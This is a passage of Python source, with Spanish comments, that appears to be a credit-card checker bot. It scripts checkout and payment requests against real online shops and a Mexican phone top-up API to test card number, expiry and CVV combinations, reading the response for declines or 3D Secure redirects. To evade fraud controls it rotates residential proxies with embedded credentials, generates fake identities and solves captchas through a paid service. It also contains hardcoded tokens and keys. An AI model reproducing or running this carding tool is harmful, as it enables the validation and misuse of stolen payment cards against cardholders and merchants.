                'variant_id': '37aa7e77-09cf-4ae0-a7b3-98bdd5ae152e',
                'quantity': '1',
            }

            response = c.post('https://www.ticktime.store/api/cart', headers=headers, data=data)
            
            

            headers = {
                'authority': 'www.ticktime.store',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                # 'cookie': 'client_id=1743051704668442; _c_id=1743051704668147383; store_locale=en-US; _gcl_au=1.1.74280633.1743051705; _identity_cart=8cfba914-c1b5-4313-83bf-0352b9263016; _mtid=14alvimb301; _identity_popups_bundle=35bcc351-fb8c-4624-964a-e0b89a7975231743051708; _identity_popups=c1a7ac44-d8d5-4ec1-bb72-af9ecade9fcf1743051708; awesomefrontcookie=4e76a35738f1a3f843a97de04e6ff4cb; __stripe_mid=080944e0-4417-4aed-a304-6c93359c7b8ad2ad80; awesomeab=gd25269-panther-v25s16s0; __cf_bm=W5ebQzz8vOV6JZAC3afOpu_mlcN0F6dsW.zZGi4i17w-1744317015-1.0.1.1-4YQdeTtVOSZtY6YHUZYwa6jKvtneXT85rHjsFPWTpUx3HEhFJ69lAzKSPGoQCx50JY5EmnSgMUKWwHkHYtbiKIj0aVVLnj1xp3gy6vM2z50; _cfuvid=18YWRSV0uQAdMKWg3KLUEry7yCOnPHNNbert7GZYliM-1744317015315-0.0.1.1-604800000; sw_session=67f82a88bd177; ss_id_a_p=1744317065782392; session_id=1744317065782392; last_land_url=https%3A%2F%2Fwww.ticktime.store%2F; last_template_name=index; _gid=GA1.2.2111401025.1744317067; checkout_locale=es-ES; googtrans=/auto/es; googtrans=/auto/es; checkout_token=%7B%22keys%22%3A%5B%7B%22source_id%22%3A%2288497-TK200006428%22%2C%22checkout_token%22%3A%22e6e8f6e902e5287620dab30d0dfb40%22%2C%22updated_at%22%3A%221744317129%22%7D%5D%7D; __stripe_sid=2added29-6958-4567-99fd-43d4e63ab9c55fdd03; _gat_gtag_UA_185103810_1=1; page_render_time=209; page_time=230; _ga=GA1.2.2113997164.1743051705; gate_time=172; _ga_FLQ5SBQQTX=GS1.1.1744317066.3.1.1744317343.16.0.0',
                'pragma': 'no-cache',
                'referer': 'https://www.ticktime.store/collections/featured-by-ticktime/products/ticktime-earphones-ear2',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.get('https://www.ticktime.store/api/cart',  headers=headers)

            headers = {
                'authority': 'www.ticktime.store',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'client_id=1743052379022348; _c_id=1743052379022390195; sw_session=67e4de5b34ed9; store_locale=en-US; page_render_time=175; page_time=196; __cf_bm=tpni0ZXhNFQ3VCFTkcNb869bD.gKotvorNEklthqNl8-1743052379-1.0.1.1-q4VmA9LPCytElyvZztCqp3CtuyxZnUVDAI5vNG2tZG5dklOsuRbRSVrGQ0M0ke1ByUEwd6UOamA0ZEKYSuqrf2JvYOhIGswi53toau0PNU4; _cfuvid=XXsRTJGKC_d50aO5P09JAz.nJRI3hAuHk4iJFJy.cxM-1743052379252-0.0.1.1-604800000; ss_id_a_p=1743052378339484; session_id=1743052378339484; shoplazza_source=%7B%22%24first_visit_url%22%3A%22https%3A%2F%2Fwww.ticktime.store%2Fcollections%2Ffeatured-by-ticktime%2Fproducts%2Fticktime-cube%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22expire%22%3A1743657178340%7D; last_land_url=https%3A%2F%2Fwww.ticktime.store%2Fcollections%2Ffeatured-by-ticktime%2Fproducts%2Fticktime-cube; last_template_name=product; _gcl_au=1.1.1492224692.1743052379; _mtid=14amk57i502; _identity_cart=14fa1067-05ab-4a44-8dbf-59047d25d8ee; _ga=GA1.2.1855904974.1743052379; _gid=GA1.2.1236957442.1743052379; _gat_gtag_UA_185103810_1=1; _identity_popups_bundle=cba25da9-071f-47bf-9a6f-001e8acc94221743052384; _identity_popups=989e61d6-2228-4991-ae17-1ddd57d66d6b1743052384; checkout_locale=es-ES; googtrans=/auto/es; googtrans=/auto/es; _ga_FLQ5SBQQTX=GS1.1.1743052379.1.0.1743052399.40.0.0; gate_time=36',
                'origin': 'https://www.ticktime.store',
                'pragma': 'no-cache',
                'referer': 'https://www.ticktime.store/collections/featured-by-ticktime/products/ticktime-cube',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'line_items[0][variant_id]': '37aa7e77-09cf-4ae0-a7b3-98bdd5ae152e',
                'line_items[0][quantity]': '1',
                'line_items[0][note]': '',
                'line_items[0][properties]': '',
                'refer_info[source]': 'cart',
                'customer_note': '',
            }

            responseChk = c.post('https://www.ticktime.store/api/checkout/order',  headers=headers, data=data)
            soup = b(responseChk.text, 'html.parser')
            response_text = responseChk.text
            response_data = json.loads(responseChk.text)
            token = response_data.get('data', {}).get('order_token')

            if token:
                print("Token:", token)
            else:
                print("No se encontró el token.")
            

            headers = {
                'authority': 'www.ticktime.store',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'client_id=1743051704668442; _c_id=1743051704668147383; store_locale=en-US; _gcl_au=1.1.74280633.1743051705; _identity_cart=8cfba914-c1b5-4313-83bf-0352b9263016; _mtid=14alvimb301; _identity_popups_bundle=35bcc351-fb8c-4624-964a-e0b89a7975231743051708; _identity_popups=c1a7ac44-d8d5-4ec1-bb72-af9ecade9fcf1743051708; awesomefrontcookie=4e76a35738f1a3f843a97de04e6ff4cb; __stripe_mid=080944e0-4417-4aed-a304-6c93359c7b8ad2ad80; awesomeab=gd25269-panther-v25s16s0; __cf_bm=W5ebQzz8vOV6JZAC3afOpu_mlcN0F6dsW.zZGi4i17w-1744317015-1.0.1.1-4YQdeTtVOSZtY6YHUZYwa6jKvtneXT85rHjsFPWTpUx3HEhFJ69lAzKSPGoQCx50JY5EmnSgMUKWwHkHYtbiKIj0aVVLnj1xp3gy6vM2z50; _cfuvid=18YWRSV0uQAdMKWg3KLUEry7yCOnPHNNbert7GZYliM-1744317015315-0.0.1.1-604800000; sw_session=67f82a88bd177; ss_id_a_p=1744317065782392; session_id=1744317065782392; last_land_url=https%3A%2F%2Fwww.ticktime.store%2F; last_template_name=index; _gid=GA1.2.2111401025.1744317067; checkout_locale=es-ES; googtrans=/auto/es; googtrans=/auto/es; __stripe_sid=2added29-6958-4567-99fd-43d4e63ab9c55fdd03; page_render_time=209; page_time=230; checkout_token=%7B%22keys%22%3A%5B%7B%22source_id%22%3A%2288497-TK200006428%22%2C%22checkout_token%22%3A%22e6e8f6e902e5287620dab30d0dfb40%22%2C%22updated_at%22%3A%221744317540%22%7D%5D%7D; _ga_FLQ5SBQQTX=GS1.1.1744317066.3.1.1744317541.59.0.0; _ga=GA1.1.2113997164.1743051705; gate_time=24',
                'origin': 'https://www.ticktime.store',
                'pragma': 'no-cache',
                'referer': 'https://www.ticktime.store/checkout/88497-TK200006428?step=contact_information',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            json_data = {
                'order_token': token,
                'card_info': {
                    'card_number': cc_number,
                    'card_date': f'{mes}/{ano_number}',
                    'card_month': mes,
                    'card_year': ano_number,
                    'card_code': cvv,
                },
                'billing_address': {
                    'id': '',
                    'first_name': name,
                    'last_name': last,
                    'phone_area_code': 'MX_52',
                    'phone': '+52 998 569 3698',
                    'country_code': 'MX',
                    'country': 'Mexico',
                    'province_code': 'MX-ROO',
                    'province': 'Quintana Roo',
                    'area': '',
                    'city': 'Othón P. Blanco',
                    'company': '',
                    'address': 'calle o242',
                    'address1': '',
                    'zip': '77086',
                    'email': '',
                    'cpf': '',
                    'id_number': '',
                    'id_number_text': '',
                    'tax_text': '',
                    'latitude': '',
                    'longitude': '',
                    'source': '',
                    'tags': '',
                    'email_or_phone': '',
                    'gender': '',
                },
                'customer_info': {
                    'newsletter': 1,
                    'note': '',
                    'email': email,
                    'save_address': 1,
                    'phone': '+1 551 698 6986',
                    'email_or_phone': '',
                },
                'payment_line': {
                    'id': 'd99cd665-61e9-4e0d-8ce7-8dd7a8111529',
                    'name': 'stripe',
                    'desc': '',
                    'tips': '',
                    'payment_channel': 'stripe',
                    'payment_method': 'credit_card',
                    'payment_key': 'stripe',
                    'payment_provider': 'stripe',
                    'public_key': 'pk_live_sABOGPJXmMMDSVEnssw1HkQv00QS4gBJVe',
                    'sort_key': 'credit_card',
                    'status': 'open',
                    'is_active': True,
                    'support_tip': True,
                    'fe_pay': False,
                    'available': False,
                    'support_cards': [
                        '//img.staticdj.com/oss/operation/b15fc6ed8f726b685310a8a5b4ebc312.svg',
                        '//img.staticdj.com/oss/operation/50927f9a9805ee57dd3971a24ab13037.svg',
                        '//img.staticdj.com/oss/operation/b068c5902e07857d5251e11f8198ad80.svg',
                        '//img.staticdj.com/oss/operation/b823bc7dd65f1a58d949dfb47916e4b2.svg',
                        '//img.staticdj.com/oss/operation/3cc7bc0c09f7f0fb19581a21abd4cd53.svg',
                    ],
                    'key_cards': {
                        'ae': '//img.staticdj.com/oss/operation/b15fc6ed8f726b685310a8a5b4ebc312.svg',
                        'diners': '//img.staticdj.com/oss/operation/50927f9a9805ee57dd3971a24ab13037.svg',
                        'discover': '//img.staticdj.com/oss/operation/b068c5902e07857d5251e11f8198ad80.svg',
                        'mastercard': '//img.staticdj.com/oss/operation/b823bc7dd65f1a58d949dfb47916e4b2.svg',
                        'visa': '//img.staticdj.com/oss/operation/3cc7bc0c09f7f0fb19581a21abd4cd53.svg',
                    },
                    'account_info': {
                        'public_key': 'pk_live_sABOGPJXmMMDSVEnssw1HkQv00QS4gBJVe',
                    },
                    'setting': {
                        'merchant_desc': '',
                        'merchant_location': '',
                        'three_d_secure': False,
                        'tc_status': True,
                        'version': 'stripe_version_v3',
                    },
                    'instalments_enable': False,
                    'click_to_pay_enable': True,
                },
                'prices': {
                    'total_price': '29.98',
                    'subtotal_price': '24.99',
                    'shipping_price': '4.99',
                    'tax_price': '0.00',
                    'shipping_tax_total': '0.00',
                    'all_tax_total': '0.00',
                    'discount_price': '0.00',
                    'discount_sub_total': '24.99',
                    'discount_line_item_price': '0.00',
                    'discount_code_price': '0.00',
                    'discount_shipping_price': '4.99',
                    'gift_card_price': '0.00',
                    'payment_discount_total': '0.00',
                    'pre_payment_amount': '29.98',
                    'paid_total': '0.00',
                    'payment_due': '29.98',
                    'additional_total': '0.00',
                    'additional_prices': [],
                    'pre_calculate_data': [],
                    'duty_total': '0.00',
                    'total_tip_received': '0.00',
                },
                'risk_control_info': [
                    {
                        'type': 'forter',
                        'forter_token_cookie': '',
                    },
                ],
                'shipping_address': {
                    'id': '88abf9ab-0525-4dcd-87de-f16055207b4b',
                    'first_name': name,
                    'last_name': last,
                    'email': email,
                    'phone': '+1 551 698 6986',
                    'country_code': 'US',
                    'country': 'United States',
                    'area': '',
                    'address': 'street 243',
                    'address1': '',
                    'origin_id': '88abf9ab-0525-4dcd-87de-f16055207b4b',
                    'company': '',
                    'phone_area_code': 'US_1',
                    'source': '',
                    'tags': '',
                    'email_or_phone': '',
                    'gender': '',
                    'province': 'New York',
                    'province_code': 'US-NY',
                    'city': 'new york',
                    'zip': '10014',
                    'extra_info': {},
                },
                'shipping_line': {
                    'delivery_method': 1,
                    'id': 'df717ef5-c0c0-48ec-84da-0d8d93310762',
                    'name': 'Standard Shipping',
                    'desc': '',
                    'shipping_price': '4.99',
                    'support_cod': 0,
                    'location_id': '0',
                    'plan_code': '',
                    'discount_shipping_price': '4.99',
                    'discounts': [],
                    'format_shipping_price': '',
                    'format_discount_shipping_price': '$4.99',
                    'is_free': False,
                },
                'use_shipping_address': '0',
                'config': {
                    'checkout_business_type': 0,
                    'checkout_template_type': 0,
                    'market_setting': {
                        'market_base_currency': '',
                        'market_base_currency_symbol': None,
                        'market_country': '',
                        'market_currency': '',
                        'market_currency_symbol': None,
                        'market_id': '',
                        'market_lang': '',
                        'market_price_setting': None,
                        'primary_market_currency': '',
                        'primary_market_currency_symbol': None,
                        'primary_market_id': '',
                        'primary_market_lang': 'en-US',
                    },
                    'page_type': 'single',
                    'product_tax_included': False,
                    'requires_shipping': True,
                },
            }

            response = c.post(
                'https://www.ticktime.store/api/checkout/order/complete',
                headers=headers,
                json=json_data,
            )

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'guid': '2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5',
                'muid': '080944e0-4417-4aed-a304-6c93359c7b8ad2ad80',
                'sid': '2added29-6958-4567-99fd-43d4e63ab9c55fdd03',
                'referrer': 'https://www.ticktime.store',
                'payment_user_agent': 'stripe.js/c5458ee6b3; stripe-js-v3/c5458ee6b3',
                'key': 'pk_live_sABOGPJXmMMDSVEnssw1HkQv00QS4gBJVe',
            }

            response = c.post('https://api.stripe.com/v1/radar/session', headers=headers, data=data)

            headers = {
                'authority': 'www.ticktime.store',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'client_id=1743051704668442; _c_id=1743051704668147383; store_locale=en-US; _gcl_au=1.1.74280633.1743051705; _identity_cart=8cfba914-c1b5-4313-83bf-0352b9263016; _mtid=14alvimb301; _identity_popups_bundle=35bcc351-fb8c-4624-964a-e0b89a7975231743051708; _identity_popups=c1a7ac44-d8d5-4ec1-bb72-af9ecade9fcf1743051708; awesomefrontcookie=4e76a35738f1a3f843a97de04e6ff4cb; __stripe_mid=080944e0-4417-4aed-a304-6c93359c7b8ad2ad80; awesomeab=gd25269-panther-v25s16s0; __cf_bm=W5ebQzz8vOV6JZAC3afOpu_mlcN0F6dsW.zZGi4i17w-1744317015-1.0.1.1-4YQdeTtVOSZtY6YHUZYwa6jKvtneXT85rHjsFPWTpUx3HEhFJ69lAzKSPGoQCx50JY5EmnSgMUKWwHkHYtbiKIj0aVVLnj1xp3gy6vM2z50; _cfuvid=18YWRSV0uQAdMKWg3KLUEry7yCOnPHNNbert7GZYliM-1744317015315-0.0.1.1-604800000; sw_session=67f82a88bd177; ss_id_a_p=1744317065782392; session_id=1744317065782392; last_land_url=https%3A%2F%2Fwww.ticktime.store%2F; last_template_name=index; _gid=GA1.2.2111401025.1744317067; checkout_locale=es-ES; googtrans=/auto/es; googtrans=/auto/es; __stripe_sid=2added29-6958-4567-99fd-43d4e63ab9c55fdd03; page_render_time=209; page_time=230; checkout_token=%7B%22keys%22%3A%5B%7B%22source_id%22%3A%2288497-TK200006428%22%2C%22checkout_token%22%3A%22e6e8f6e902e5287620dab30d0dfb40%22%2C%22updated_at%22%3A%221744317540%22%7D%5D%7D; _ga=GA1.1.2113997164.1743051705; gate_time=532; _ga_FLQ5SBQQTX=GS1.1.1744317066.3.1.1744317735.60.0.0; _gat_gtag_UA_185103810_1=1',
                'origin': 'https://www.ticktime.store',
                'pragma': 'no-cache',
                'referer': 'https://www.ticktime.store/checkout/88497-TK200006428?step=contact_information',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'order_token': token,
                'billing_address': {
                    'id': '',
                    'first_name': name,
                    'last_name': last,
                    'phone_area_code': 'MX_52',
                    'phone': '+52 998 569 3698',
                    'country_code': 'MX',
                    'country': 'Mexico',
                    'province_code': 'MX-ROO',
                    'province': 'Quintana Roo',
                    'area': '',
                    'city': 'Othón P. Blanco',
                    'company': '',
                    'address': 'calle o242',
                    'address1': '',
                    'zip': '77086',
                    'email': '',
                    'cpf': '',
                    'id_number': '',
                    'id_number_text': '',
                    'tax_text': '',
                    'latitude': '',
                    'longitude': '',
                    'source': '',
                    'tags': '',
                    'email_or_phone': '',
                    'gender': '',
                },
                'payment_line': {
                    'id': 'd99cd665-61e9-4e0d-8ce7-8dd7a8111529',
                    'name': 'stripe',
                    'desc': '',
                    'tips': '',
                    'payment_channel': 'stripe',
                    'payment_method': 'credit_card',
                    'payment_key': 'stripe',
                    'payment_provider': 'stripe',
                    'public_key': 'pk_live_sABOGPJXmMMDSVEnssw1HkQv00QS4gBJVe',
                    'sort_key': 'credit_card',
                    'status': 'open',
                    'is_active': True,
                    'support_tip': True,
                    'fe_pay': False,
                    'available': False,
                    'support_cards': [
                        '//img.staticdj.com/oss/operation/b15fc6ed8f726b685310a8a5b4ebc312.svg',
                        '//img.staticdj.com/oss/operation/50927f9a9805ee57dd3971a24ab13037.svg',
                        '//img.staticdj.com/oss/operation/b068c5902e07857d5251e11f8198ad80.svg',
                        '//img.staticdj.com/oss/operation/b823bc7dd65f1a58d949dfb47916e4b2.svg',
                        '//img.staticdj.com/oss/operation/3cc7bc0c09f7f0fb19581a21abd4cd53.svg',
                    ],
                    'key_cards': {
                        'ae': '//img.staticdj.com/oss/operation/b15fc6ed8f726b685310a8a5b4ebc312.svg',
                        'diners': '//img.staticdj.com/oss/operation/50927f9a9805ee57dd3971a24ab13037.svg',
                        'discover': '//img.staticdj.com/oss/operation/b068c5902e07857d5251e11f8198ad80.svg',
                        'mastercard': '//img.staticdj.com/oss/operation/b823bc7dd65f1a58d949dfb47916e4b2.svg',
                        'visa': '//img.staticdj.com/oss/operation/3cc7bc0c09f7f0fb19581a21abd4cd53.svg',
                    },
                    'account_info': {
                        'public_key': 'pk_live_sABOGPJXmMMDSVEnssw1HkQv00QS4gBJVe',
                    },
                    'setting': {
                        'merchant_desc': '',
                        'merchant_location': '',
                        'three_d_secure': False,
                        'tc_status': True,
                        'version': 'stripe_version_v3',
                    },
                    'instalments_enable': False,
                    'click_to_pay_enable': True,
                },
                'risk_control_info': [
                    {
                        'type': 'forter',
                        'forter_token_cookie': '',
                    },
                ],
                'use_shipping_address': '0',
                'payment_extension': {},
                'prices': {
                    'total_price': '29.98',
                    'subtotal_price': '24.99',
                    'shipping_price': '4.99',
                    'tax_price': '0.00',
                    'shipping_tax_total': '0.00',
                    'all_tax_total': '0.00',
                    'discount_price': '0.00',
                    'discount_sub_total': '24.99',
                    'discount_line_item_price': '0.00',
                    'discount_code_price': '0.00',
                    'discount_shipping_price': '4.99',
                    'gift_card_price': '0.00',
                    'payment_discount_total': '0.00',
                    'pre_payment_amount': '29.98',
                    'paid_total': '0.00',
                    'payment_due': '29.98',
                    'additional_total': '0.00',
                    'additional_prices': [],
                    'pre_calculate_data': [],
                    'duty_total': '0.00',
                    'total_tip_received': '0.00',
                },
                'card_info': {
                    'card_number': cc_number,
                    'card_date': f'{mes}/{ano_number}',
                    'card_month': mes,
                    'card_year': ano_number,
                    'card_code': cvv,
                },
                'browser_info': {
                    'java_enabled': 0,
                    'color_depth': 24,
                    'screen_height': 1067,
                    'screen_width': 1707,
                    'time_zone_offset': 300,
                    'accept-language': 'es-ES',
                },
                'extra_info': {
                    'version': 'stripe_version_v3',
                    'risk_session': 'rse_1RCRvPCqe4ZYWauSh0UGQext',
                },
                'payment_irrelevant_info': {
                    'redirect_config': {},
                },
            }

            responseChkk = c.post('https://www.ticktime.store/api/checkout/payments/pay',  headers=headers, json=json_data)
           
            soup = b(responseChkk.text, 'html.parser')
            response_text = soup.text.strip()

            try:
                # Convertir el texto a JSON
                responsePm = json.loads(response_text)

                # Verificar si responsePm['data'] y responsePm['data']['result'] existen y son diccionarios
                if isinstance(responsePm.get('data'), dict) and isinstance(responsePm['data'].get('result'), dict):
                    redirect_url = responsePm['data']['result'].get('redirect_url')

                    if redirect_url:
                        return("🔎 Redirección 3D Secure detectada.")
                    else:
                        return("✅ No hay redirección 3D Secure.")
                else:
                    print("❗ Estructura de datos inesperada o incompleta.")

                # Obtener y mostrar los errores si existen
                errores = responsePm.get('errors', [])
                if isinstance(errores, list) and errores:
                    mensaje_final = ' '.join(errores)
                    return(mensaje_final)
                else:
                    return("✅ No se encontraron errores.")

            except json.JSONDecodeError as e:
                return(f"Error al decodificar JSON: ")

            
                                                

          

                    
            print("Status Code:", response.status_code)
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


async def toston(card: str) -> str:
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
            contraseña = "Saiper123"
            host = "us.resiproxies.net"
            puerto = "16666"

            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

            c.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }

            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#

            numeros_disponibles = [
                "5635116853", "5635161652", "5635117040", "5635117578", "5635119868", "5635120199"
            ]

            elegido = random.choice(numeros_disponibles)
            print(elegido)
            
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'msisdn': elegido,
            }

            response = c.get('https://redphone.api.koonolmexico.com/altan_services/validate', params=params, headers=headers)
            responsePm = json.loads(response.text)
            if "altan_service" in responsePm and "id" in responsePm["altan_service"]:
                id_servicio = responsePm["altan_service"]["id"]
                print(id_servicio)
            else:
                return "❌ Usa otra tarjeta o comando"
            

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'primary_offering_id': '122',
                'publicly_available': 'true',
                'service_type': 'mbb',
                'interface_mask': '128',
            }

            response = c.get('https://redphone.api.koonolmexico.com/offerings', params=params, headers=headers)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'segment_id': '1',
                'altanServiceId': '108883',
                'publicly_available': 'true',
                'service_type': 'mbb',
                'interface_mask': '128',
                'altan_speed_limit': 'best_effort',
                'service_offer_type': 'primary',
                'offering_type': 'top_up',
                'is_multiple_activation': 'true',
            }

            response = c.get('https://redphone.api.koonolmexico.com/offerings', params=params, headers=headers)

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
